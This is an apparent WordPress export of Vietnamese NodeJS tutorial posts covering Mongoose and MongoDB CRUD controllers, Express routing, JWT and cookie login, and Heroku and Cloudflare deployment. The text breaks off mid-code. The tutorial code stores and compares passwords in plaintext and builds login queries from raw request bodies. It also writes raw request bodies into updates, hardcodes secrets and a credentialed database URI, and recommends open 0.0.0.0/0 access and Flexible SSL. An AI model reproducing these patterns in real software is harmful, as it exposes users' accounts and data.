		<title><![CDATA[NodeJS - 8. Mongoose Controller]]></title>
		<link>https://duycode.com/2021/05/08/nodejs-note/</link>
		<pubDate>Sat, 08 May 2021 07:28:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=13</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Class: MongooseController</h2>
Tạo file ./src/app/controllers/MongooseController.js
<pre>
class MongooseController {
	constructor(collection, conditions) {
		this.collection = collection;
		this.conditions = conditions;
	}

	add = (req, res, next) => {
		Object.assign(req.body, {
			createdAt: Date.now(),
			updatedAt: Date.now(),
			removedAt: 0,
		});
		console.log(req.body);
		const document = new this.collection(req.body);
		document
			.save()
			.then((results) => res.json(results))
			.catch(next);
	};

	findOneById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: req.params.id });
		this.collection
			.findOne(qualified)
			.then((results) => res.json(results))
			.catch(next);
	};

	updateOneById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: req.params.id });
		Object.assign(req.body, {
			updatedAt: Date.now(),
		});
		this.collection
			.findOneAndUpdate(qualified, req.body, { new: true })
			.then((results) => res.json(results))
			.catch(next);
	};

	replaceOneById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: req.params.id });
		Object.assign(req.body, {
			updatedAt: Date.now(),
		});
		this.collection
			.findOneAndReplace(qualified, req.body, { new: true })
			.then((results) => res.json(results))
			.catch(next);
	};

	removeOneById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: req.params.id });
		this.collection
			.findOneAndUpdate(qualified, { removedAt: Date.now() }, { new: true })
			.then((results) => res.json(results))
			.catch(next);
	};

	restoreOneById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: req.params.id });
		this.collection
			.findOneAndUpdate(qualified, { removedAt: 0 }, { new: true })
			.then((results) => res.json(results))
			.catch(next);
	};

	deleteOneById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: req.params.id });
		this.collection
			.deleteOne(qualified)
			.then((results) => res.json(results))
			.catch(next);
	};

	findListExist = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { removedAt: 0 });

		this.collection
			.find(qualified)
			.then((results) => res.json({ data: results }))
			.catch((err) => next());
	};

	findListTrash = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { removedAt: { $ne: 0 } });

		this.collection
			.find(qualified)
			.then((results) => res.json({ data: results }))
			.catch((err) => next());
	};

	removeListById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: { $in: req.body.ids } });

		this.collection
			.updateMany(qualified, { removedAt: Date.now() })
			.then((results) => res.json(results))
			.catch(next);
	};

	restoreListById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: { $in: req.body.ids } });
		this.collection
			.updateMany(qualified, { removedAt: 0 })
			.then((results) => res.json(results))
			.catch(next);
	};

	deleteListById = (req, res, next) => {
		let conditions = this.conditions(req, res, next);
		let qualified = Object.assign({}, conditions, { _id: { $in: req.body.ids } });
		this.collection
			.deleteMany(qualified)
			.then((results) => res.json(results))
			.catch(next);
	};
}

module.exports = MongooseController;

</pre>

<h2>2. Sử dụng</h2>
Tạo file ./src/app/controllers/Controllers.js
<pre>
const mongoDB = require('../../config/database/mongoDB');
const ObjectId = require('mongodb').ObjectId;
const MongooseController = require('./MongooseController');

const SinhVien = require('../models/SinhVien');

const SinhVienController = new MongooseController(SinhVien);

module.exports = {SinhVienController};

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>13</wp:post_id>
		<wp:post_date><![CDATA[2021-05-08 14:28:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-08 07:28:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-08 14:28:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-08 07:28:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-note]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS - 6. Routes và Views]]></title>
		<link>https://duycode.com/2021/05/06/nodejs-4-routes/</link>
		<pubDate>Wed, 05 May 2021 17:00:50 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=624</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Routes</h1>
<h2>1. Tại ./src/index.js</h2>
<pre>
const router = require('./routes/router');
app.use('/', router);
</pre>

<h2>2. Tại ./src/routes/routes.js</h2>
<pre>
const express = require('express');
const router = express.Router();

//Có thể call một router khác
const adminRouter = require('./adminRouter');
router.use('/admin', adminRouter);

//Có thể render ra một view
router.use('/', (req, res) => {
	res.render('home/index');
});

module.exports = router;
</pre>

<h1>Views</h1>
- Thư viện thường dùng: ejs]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>624</wp:post_id>
		<wp:post_date><![CDATA[2021-05-06 00:00:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-05 17:00:50]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-06 00:00:50]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-05 17:00:50]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-4-routes]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 5. Connect MongoDB]]></title>
		<link>https://duycode.com/2021/05/05/nodejs-4-2-deploy-heroku-va-connect-mongodb/</link>
		<pubDate>Tue, 04 May 2021 17:00:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=745</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>I. Cấu hình MongoDB</h1>
<h2>1. Dùng trên Localhost: MongoDB Compass</h2>
- Download: <a href="https://www.mongodb.com/try" rel="noopener" target="_blank">https://www.mongodb.com/try</a>
- Vào Onpremises -> MingoDB Community Server -> Download -> Install bình thường
- Để link truy cập Localhost tại file .env
<blockquote>
MONGO_LOCALHOST=mongodb://localhost:27017/medihome
</blockquote>

<h2>2. Tạo Project trên MongoDB</h2>
1.1. Tạo Cluster
- Đăng nhập -> Tạo Project (2 bước: Tên Project và add Member)
- Build Cluster
1.2. Connect Cluster 
- Cài Network Access: IP được phép truy cập trước (nên chọn 0.0.0.0/0 -> có thể truy cập mọi nơi để tránh phát sinh lỗi)
- Cài tài khoản có quyền truy cập
1.3. Cấu hình
- Để link truy cập MongoDBtại file .env
<blockquote>
MONGODB_URI=mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true
</blockquote>

<h1>II. Kết nối MongoDB</h1>
<h2>1. Cấu hình file ./.env</h2>
<pre>
MONGODB_URI=mongodb+srv://user:password@cluster0.bgpn9.mongodb.net/dbname?retryWrites=true&w=majority
MONGO_LOCALHOST=mongodb://localhost:27017/medihome
MONGODB_DB_NAME=medihome
</pre>
<h2>2. Dùng mongodb</h2>
1.1. Cài đặt thư viện:
<a href="https://www.npmjs.com/package/mongodb" rel="noopener" target="_blank">https://www.npmjs.com/package/mongodb</a>
<blockquote>npm i mongodb</blockquote>

1.2. Tạo file: src/config/database/mongoDB.js
<pre>
const MongoClient = require('mongodb').MongoClient;
let _mongodb;
let options = { useNewUrlParser: true, useUnifiedTopology: true };

let connect = async (uri, dbname) => {
	try {
		let client = new MongoClient(uri, options);
		let _connection = await client.connect();
		_mongodb = _connection.db(dbname);
        console.log('\x1b[33m' + 'MongoDB connect successfully !!!' + '\x1b[0m');
	} catch (error) {
		console.log('\x1b[33m\x1b[41m' + error + '\x1b[0m');
	}
};

let getDB = () => {
	return _mongodb;
};

module.exports = { getDB, connect };
</pre>

1.3. Tại file: src/server.js
<pre>
const uri = process.env.MONGODB_URI || process.env.MONGO_LOCALHOST;
const mongoDB = require('./config/database/mongoDB');
mongoDB.connect(uri, process.env.MONGODB_DB_NAME);
</pre>

1.4. Sử dụng
<pre>
const mongoDB = require('../../../config/database/mongoDB');
const ObjectId = require('mongodb').ObjectId;

let collection = mongoDB.getDB().collection('phieunhapthuocs');
collection.insertOne(req.body, (error, results) => {
	if (error) throw error;
	console.log('Insert One, Have Done !!!');
});
</pre>

<h2>3. Dùng mongoose</h2>
2.1. Cài đặt thư viện:
-- Github: <a href="https://github.com/Automattic/mongoose" rel="noopener" target="_blank">https://github.com/Automattic/mongoose</a>
<blockquote>npm install mongoose</blockquote>

3.2. Tạo file: src/config/database/mongo.js
<pre>
const mongoose = require('mongoose');

connect = (uri) => {
    let options = {
        useNewUrlParser: true,
        useUnifiedTopology: true,
        useCreateIndex: true,
        useFindAndModify: false,
    }
    mongoose.connect(uri, options)
        .then(() => console.log('Connect successfully !!!'))
        .catch((error) => console.log('Connect failure !!!'))
}

module.exports = { connect };
</pre>

3.3. Tại file: src/server.js
<pre>
const uri = process.env.MONGODB_URI || process.env.MONGO_LOCALHOST;
const mongo = require('./config/database/mongo');
mongo.connect(uri);
</pre>

3.4. Sử dụng
<pre>
const mongoDB = require('../../../config/database/mongoDB');

mongoDB.getDB().collection('users').find({}, function (error, result) {
	if (error) throw error;
	result.toArray(function (err, list) {
		console.log(list[0]);
	});
});
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>745</wp:post_id>
		<wp:post_date><![CDATA[2021-05-05 00:00:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-04 17:00:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-05 00:00:29]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-04 17:00:29]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-4-2-deploy-heroku-va-connect-mongodb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 9.3. Authentication: Middleware]]></title>
		<link>https://duycode.com/2021/05/09/nodejs-9-3-authentication-middleware/</link>
		<pubDate>Sat, 08 May 2021 23:00:32 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=794</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Routes</h2>
-- Để kiểm tra đăng nhập với mọi Request, cho middleware lên đầu.
-- Thêm middleware vào mỗi router, giả sử muốn vào trang ad bắt buộc đăng nhập
-- Tại file: ./src/routes/router.js
<pre>
const express = require('express');
const router = express.Router();

const accountRouter = require('./accountRouter');
const adminRouter = require('./adminRouter');

const authen = require('../app/middlewares/authentication');

router.use(authen.getUser);

router.use('/account', accountRouter);
router.use('/admin', authen.requireLogin, adminRouter);

router.use('/', (req, res) => {
	res.render('home/index');
});

module.exports = router;
</pre>

<h2>2. Middleware</h2>
-- Tạo file: ./src/app/middlewares/authentication.js 
<pre>
const jwt = require('jsonwebtoken');
const mongoDB = require('../../config/database/mongoDB');
const ObjectId = require('mongodb').ObjectId;

module.exports = {
	getUser: async function (req, res, next) {
		if (!req.signedCookies.accountID) {
			res.locals.account = {};
			return next();
		}
		try {
			let token = req.signedCookies.accountID,
				decode = jwt.verify(token, process.env.SECRET_JWT),
				accountID = decode._id;

			let collection = mongoDB.getDB().collection('accounts'),
				account = await collection.findOne({ _id: new ObjectId(accountID) });

			if (!account) {
				res.clearCookie('accountID');
				res.locals.account = {};
			} else {
				res.locals.account = account;
			}
			return next();
		} catch (err) {
			res.clearCookie('accountID');
			res.locals.account = {};
			return next();
		}
	},
	requireLogin: function(req, res, next) {
        if (!res.locals.account.Gmail) {
            return res.redirect('/account/login');
        }
        return next();
    },
};

</pre>

<h2>3. Tại view EJS</h2>
-- Dùng if else để check đăng nhập chưa rất dễ dàng
<pre>
<div id="info-user">
	<% if (locals.account.Gmail) { %> 
		<%= locals.account.Gmail %> 
		<a href="/account/logout">Logout</a>
	<% } else { %>
		<a href="/account/login">Đăng nhập</a>
	<% } %>
</div>
</pre>

<h2>4. Tại Controller</h2>
-- Thêm điều kiện của res.locals vào mỗi Query sẽ được kết quả mong muốn :v
<pre>
findListExist = (req, res, next) => {
	let conditions = {
		ManagerID: res.locals.account.ManagerID,
		removedAt: 0,
	};
	Collection.find(conditions)
		.then((results) => res.json({ data: results }))
		.catch((err) => next());
};
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>794</wp:post_id>
		<wp:post_date><![CDATA[2021-05-09 06:00:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-08 23:00:32]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-09 06:00:32]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-08 23:00:32]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-9-3-authentication-middleware]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 9.2. Authentication:  jsonwebtoken và cookie-parser]]></title>
		<link>https://duycode.com/2021/05/09/nodejs-9-2-authentication-jsonwebtoken-va-cookie-parser/</link>
		<pubDate>Sat, 08 May 2021 20:00:01 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=808</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. jsonwebtoken </h1>
-- Cài đặt: <blockquote>npm install jsonwebtoken</blockquote>
<pre>
const jwt = require('jsonwebtoken');

let data = {_id : 'duycode'};

//encode object data --> tạo ra chuỗi token:
let token = jwt.sign(data,'kjKJK#XC&*ZCDS#', {
    expiresIn: 60 * 60
});

console.log(token)
//eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiJkdXljb2RlIiwiaWF0IjoxNjExNzI5NjE3fQ.GSiTLZIqgUDyj-JdGZjo1lR72WBdajbNj96BxZAA3ms

//decode chuỗi token --> tạo ra object data
let decode = jwt.verify(token,'kjKJK#XC&*ZCDS#');

console.log(decode)
//{ _id: 'duycode', iat: 1611730075, exp: 1611730105 }
</pre>

<h2>2. cookie-parser </h2>
-- Cài đặt: <blockquote>npm install cookie-parser</blockquote>
2.1. Tại ./src/server.js
<pre>
const cookieParser = require('cookie-parser');
app.use(cookieParser(@$123%@#XYZ));
</pre>
2.2. Sử dụng
<pre>
// Set cookie cho response, -> key: 'userID'; value: token
res.cookie('userID', token, {
    signed: true,
});

// Get cookie
let token = req.signedCookies.userID;

// Delete cookie
res.clearCookie('userID');
</pre>

<h2>3. Khai báo thêm biến của .env hoặc trên Heroku </h2>
<blockquote>
SECRET_JWT=kjKJK#XC&*ZCDS#
SECRET_SIGNEDCOOKIES=@$123%@#XYZ
</blockquote>

<h2>4. AccountController</h2>
-- Tại file: ./src/app/controllers/AccountController.js
-- Tạo chuỗi token với object là: {_id: account._id};
-- Lưu chuỗi token vào cookie
<pre>
const mongoDB = require('../../config/database/mongoDB');
const jwt = require('jsonwebtoken');

class AccountController {
	register = async (req, res, next) => {
		try {
			let newAccount = {
				Gmail: req.body.Gmail,
				Phone: req.body.Phone,
				Password: req.body.Password,
				Role: 'Manager',

				createdAt: Date.now(),
				updatedAt: Date.now(),
				removedAt: 0,
			};
			let response = await mongoDB.getDB().collection('accounts').insertOne(newAccount);
			console.log('Tạo tài khoản mới thành công: ', response.ops);

			//Tạo token và lưu token vào cookie
			let token = jwt.sign({ _id: newAccount._id }, process.env.SECRET_JWT);
			res.cookie('accountID', token, {
				signed: true,
			});

			res.json({ data: response.ops[0] });
		} catch (error) {
			console.log(error);
			res.json({ error: error });
		}
	};

	login = async (req, res, next) => {
		try {
			let query = {
				Gmail: req.body.Gmail,
				Password: req.body.Password,
			};
			let account = await mongoDB.getDB().collection('accounts').findOne(query);
			console.log('Đăng nhập thành công', account);

			//Tạo token và lưu token vào cookie
			let token = jwt.sign({ _id: account._id }, process.env.SECRET_JWT);
			res.cookie('accountID', token, {
				signed: true,
			});

			res.json({ data: account });
		} catch (error) {
			console.log(error);
			res.json({ error: error });
		}
	};

	logout = (req, res, next) => {
		//Xóa cookie
		res.clearCookie('accountID');
		res.redirect('/');
	};
}

module.exports = new AccountController();

</pre>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>808</wp:post_id>
		<wp:post_date><![CDATA[2021-05-09 03:00:01]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-08 20:00:01]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-09 03:00:01]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-08 20:00:01]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-9-2-authentication-jsonwebtoken-va-cookie-parser]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 9.1. Authentication: Register account]]></title>
		<link>https://duycode.com/2021/05/09/nodejs-9-1-authentication-register-account/</link>
		<pubDate>Sat, 08 May 2021 17:00:47 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=859</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. View</h2>
1. Tạo file ./src/resources/views/account/account-register.ejs
<pre>
<input type="text" name="Gmail" placeholder="Username" required />
<input type="text" name="Phone" placeholder="0xxx.xxx.xxx" required />
<input type="password" name="Password" placeholder="Password" autocomplete="off" required />
<button id="btn_Register">Register</button>

<script>
	let ip_Gmail = document.querySelector('input[name="Gmail"]');
	let ip_Phone = document.querySelector('input[name="Phone"]');
	let ip_Password = document.querySelector('input[name="Password"]');
	let btn_Register = document.getElementById('btn_Register');

	btn_Register.onclick = (e) => {
		e.preventDefault();
		if (ip_Gmail.value == '' || ip_Phone.value == '' || ip_Password.value == '') return;

		let account = {
			Gmail: ip_Gmail.value + '@gmail.com',
			Phone: '0' + ip_Phone.value,
			Password: ip_Password.value,
		};

		fetch('/account/register', {
			method: 'POST',
			body: JSON.stringify(account),
			headers: {
				'Content-Type': 'application/json',
			},
		})
			.then((response) => response.json())
			.then((resp) => {
				console.log(resp);
				if (resp.error) alert('Tạo tài khoản thất bại, lỗi hệ thống');
				else if (!resp.data) alert('Đăng ký thất bại, tên tài khoản trùng khớp');
				else if (resp.data) {
					alert('Tạo tài khoản thành công');
					window.open('/', '_self');
				}
			})
			.catch((err) => console.warn(err));
	};
</script>

</pre>

2. Tạo file ./src/resources/views/account/account-login.ejs
<pre>
<input type="text" name="Gmail" placeholder="Username" required />
<input type="password" name="Password" placeholder="Password" autocomplete="off" required />
<button id="btn_Login">Login</button>

<script>
	let ip_Gmail = document.querySelector('input[name="Gmail"]');
	let ip_Password = document.querySelector('input[name="Password"]');
	let btn_Login = document.getElementById('btn_Login');

	btn_Login.onclick = (e) => {
		e.preventDefault();
		if (ip_Gmail.value == '' || ip_Password == '') return;

		let account = {
			Gmail: ip_Gmail.value + '@gmail.com',
			Password: ip_Password.value,
		};

		fetch('/account/login', {
			method: 'POST',
			body: JSON.stringify(account),
			headers: {
				'Content-Type': 'application/json',
			},
		})
			.then((response) => response.json())
			.then((resp) => {
				console.log(resp);
				if (resp.error) alert('Đăng nhập thất bại, lỗi hệ thống');
				else if (!resp.data) alert('Đăng nhập thất bại, sai thông tin');
				else if (resp.data){
					alert('Đăng nhập thành công');
					window.open('/','_self');
				} 
			})
			.catch((err) => console.warn(err));
	};
</script>


</pre>

<h2>2. Router</h2>
- Tạo ./src/routes/accountRouter.ejs
<pre>
const express = require('express');
const router = express.Router();

const controller = require('../app/controllers/AccountController');

router.get('/register', (req, res, next)=>{
    res.render('account/account-register');
});
router.get('/login', (req, res, next)=>{
    res.render('account/account-login');
});


router.post('/register', controller.register);
router.post('/login', controller.login)
router.get('/logout', controller.logout);
module.exports = router;
</pre>

<h2>3. Controller</h2>
- Tạo file ./src/app/controllers/AccountController.js
<pre>
const mongoDB = require('../../config/database/mongoDB');

class AccountController {
	register = async (req, res, next) => {
		try {
			let newAccount = {
				Gmail: req.body.Gmail,
				Phone: req.body.Phone,
				Password: req.body.Password,
				Role: 'Manager',

				createdAt: Date.now(),
				updatedAt: Date.now(),
				removedAt: 0,
			};
			let findAccount = await mongoDB.getDB().collection('accounts').findOne({ Gmail: req.body.Gmail });
			if (findAccount) {
				res.json({ data: null });
			} else {
				let response = await mongoDB.getDB().collection('accounts').insertOne(newAccount);
				console.log('Tạo tài khoản mới thành công: ', response.ops);
				res.json({ data: response.ops[0] });
			}
		} catch (error) {
			console.log(error);
			res.json({ error: error });
		}
	};

	login = async (req, res, next) => {
		try {
			let query = {
				Gmail: req.body.Gmail,
				Password: req.body.Password,
			};
			let account = await mongoDB.getDB().collection('accounts').findOne(query);
			if (account) {
			}
			res.json({ data: account });
		} catch (error) {
			console.log(error);
			res.json({ error: error });
		}
	};

	logout = (req, res, next) => {};
}

module.exports = new AccountController();

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>859</wp:post_id>
		<wp:post_date><![CDATA[2021-05-09 00:00:47]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-08 17:00:47]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-09 00:00:47]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-08 17:00:47]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-9-1-authentication-register-account]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 4. Deploy Github và Heroku, Trỏ Domain qua Cloudflare]]></title>
		<link>https://duycode.com/2021/05/04/nodejs-4-1-deploy-heroku-va-connect-mongodb/</link>
		<pubDate>Mon, 03 May 2021 17:00:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=879</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>I. Đẩy từ Local lên Git</h1>
- Tại file ./.gitignore
<pre>
.env
.gitignore
node_modules
</pre>
- Tại file ./.env
<pre>
MONGODB_URI=mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true
MONGO_LOCALHOST=mongodb://localhost:27017/bstrang
MONGODB_DB_NAME=bstrang
</pre>
- Tại file ./Procfile
<pre>
web: node src/server.js
</pre>
- Tại file ./src/server.js , cần lưu ý cổng PORT
<pre>
if (!process.env.PORT) require('dotenv').config();
const port = process.env.PORT || 3000;
</pre>
-- Đầy đủ các mục trên là có thể đẩy tạm thời lên git được rồi

<h1>II. Deploy lên Heroku</h1>
<h2>1. Cấu hình</h2>
- Tại file ./src/server.js , cần lưu ý cổng PORT
<pre>
if (!process.env.PORT) require('dotenv').config();
const port = process.env.PORT || 3000;
</pre>
- Tạo file "Procfile" (không có đuôi mở rộng) tại thư mục gốc: ./Procfile
<pre>
web: node src/server.js
</pre>

<h2>2. Cách 1: Deploy lên Heroku bằng Heroku Git</h2>
- Bước 1: Cài Heroku CLI
- Bước 2: Dùng Command Prompt với quyền Administrator (từ lần thứ 2 trở đi, có thể dùng Terminal của VSCode)
<blockquote>
heroku login

cd my-project/
git init
heroku git:clone -a yourproject

git add .
git commit -am "make it better"
git push heroku master
</blockquote>

<h2>3. Cách 2: Deploy lên Heroku bằng Github</h2>
- Trên trang heroku, phần Deploy -> Deployment method: chọn phương thức Github
- Tích chọn: Automatic deploys from  master are enabled

- Dùng trình duyệt vào website hưởng thành quả, VD: <a href="https://medihome-vn.herokuapp.com/manager" rel="noopener" target="_blank">https://medihome-vn.herokuapp.com/manager</a>

<h2>4. Tạo biến thay file .env</h2>
-- Vào Setting -> Config Vars -> Thêm biến tương ứng cặp Key - Value
<blockquote>
KEY: MONGODB_URI
VALUE: mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true
</blockquote>

<h1>III. Trỏ tên miền từ Cloudflare về Heroku</h1>
1. Trên Heroku -> Settings -> Add Domain
-> Lấy DNS Target, trông dạng như sau:
<blockquote>polished-spider-g32lzit2sw0tgd521lnn6pwl.herokudns.com</blockquote>

2. Trên Cloudflare
<table>
<tr>
<td>CNAME</td>
<td>medihome.vn</td>
<td>polished-spider-g32lzit2sw0tgd521lnn6pwl.herokudns.com</td>
</tr>
<tr>
<td>CNAME</td>
<td>www</td>
<td>polished-spider-g32lzit2sw0tgd521lnn6pwl.herokudns.com</td>
</tr>
</table>

-- Nhớ trỏ nameserver từ domain -> về cloudflare. Ví dụ:
<table>
<tr>
<td>Nameserver 1</td>
<td>ben.ns.cloudflare.com</td>
</tr>
<tr>
<td>Nameserver 2</td>
<td>may.ns.cloudflare.com</td>

</tr>
</table>

3. Trên Cloudflare -> SSL/TLS
- Chọn Flexible (nghĩa là dùng SSL từ Browser đến Cloudflare, còn từ Cloudflare đến Heroku thì ko có SSL)]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>879</wp:post_id>
		<wp:post_date><![CDATA[2021-05-04 00:00:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-03 17:00:35]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-04 00:00:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-03 17:00:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-4-1-deploy-heroku-va-connect-mongodb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 7. NoSQL : P1. MongoDB Controller]]></title>
		<link>https://duycode.com/2021/05/07/nodejs-7-nosql-p1-mongodb-controller/</link>
		<pubDate>Thu, 06 May 2021 17:00:57 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=971</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. MongoDBController</h2>
<pre>
const mongoDB = require('../../database/mongoDB')
const ObjectId = require('mongodb').ObjectId

module.exports = class MongoDBController {
    constructor (name){
        this.name = name
    }
    all = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            let result = await collection.find({ removedAt: 0 }).toArray()
            res.json({ data: result })
